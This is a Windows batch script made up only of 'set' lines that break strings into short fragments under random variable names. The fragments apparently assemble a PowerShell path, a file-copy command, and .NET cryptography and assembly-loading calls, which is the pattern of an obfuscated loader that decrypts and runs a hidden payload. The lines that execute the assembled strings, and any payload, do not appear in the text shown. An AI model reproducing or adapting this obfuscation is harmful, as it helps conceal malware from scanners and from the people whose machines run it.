@echo off
set "OwtuIugOBc=ll"
set "ufLEjTfRya=ll"
set "cnktTtBbkP=rS"
set "kUFZmiVlUx=Sy"
set "CkhUtUyeQq=\W"
set "vaImhpDvSA=Po"
set "ACkSVzgJdv=s\"
set "nyckBmkqkB=we"
set "ymJhwoyrAB=:\"
set "nNzhiZNWwM=po"
set "wmaciksjfD=ws"
set "oaCUAabdUk=he"
set "vzwPzKusOk=y "
set "sYxeKAqUQU=rs"
set "HsUeBiQotO=\v"
set "OBlcjhbirw=1."
set "tAusiQCwRY=Wi"
set "xprymZqSnu=nd"
set "lhwZgnmSVQ= /"
set "OcfmAgCapb=we"
set "ZBbmmMrwXJ= C"
set "KfjPGZTKup=py"
set "shbZnGUQLy=0\"
set "AsezhRkEAk=co"
set "vDFkfpquxH=.e"
set "dwIgFrRlUw=do"
set "rHaXVdNvYp=he"
set "ISfCynVhKA=xe"
set "YGdfbFTEFK=st"
set "vAezxUfyDN=em"
set "FCdsaJQgBr=in"
set "SGOSkFiHDD=32"
set "AOGQMxvcsr=ow"
set "EGhlMXhyFY=cd"
set "JANPRXpRke= %~dp0"
set "bLWXPkxUVw=.Key"
set "qIRhjgMTOm=iron"
set "XngPVZTLRb=.Cry"
set "nHyJYIKdnM= = $"
set "OHpxSuPHEU=hy.A"
set "drLQzzlIng=1] -"
set "FYIGugjfxo=tX, "
set "sqcbMKsNQL=File"
set "VlEpvSuIzO=Bmor"
set "BnRLztOMuV== [S"
set "OiXlPDzjAg=rity"
set "LUiQNxCaDc=m(, "
set "pOaJYWsLQT=e = "
set "AGEYzweVLx=);$e"
set "TPPxfIXCEv=vFei"
set "lDaNPWckUG=KsNT"
set "JEKVYjjdiL=);$G"
set "OgYqqAijKc== $e"
set "xwhyxyIKNp=V = "
set "WjfApjjLMy=('da"
set "rpzoJCBcqW=;$zD"
set "JAfVLHXfNt=n.Su"
set "CAzUzjuFMk=tS46"
set "dUckfyVTAI=..-1"
set "PhwQwRsLRt=embl"
set "aKQpszJWTh=.-16"
set "DgkvvCIHrh=yste"
set "NDucJBuukx=();$"
set "AxfUFMzqTP=[Env"
set "CAmoJiMeIR=O.Me"
set "XXNkHcFMvP=.Sec"
set "gNCXWhDEwM=Y.En"
set "MKfccXuxbm=ment"
set "NimdDalEgB=eUDS"
set "DfUgCProne=CKsN"
set "yOEplSACSK=, (,"
set "TLeHJJadTu=em.C"
set "GHJenBmPMC=]::N"
set "IyfGjwjsGT=ck($"
set "UKkhecTtkE= '')"
set "IuZNLyHfsx=.Dis"
set "aOfMrFiEkl=KsNT"
set "OHiuygRmNl=ptor"
set "VJwUUveaGV=nage"
set "GREsexuUWL=form"
set "EhNozmBJvR=:: '"
set "aEHfuTFtcn=gjYA"
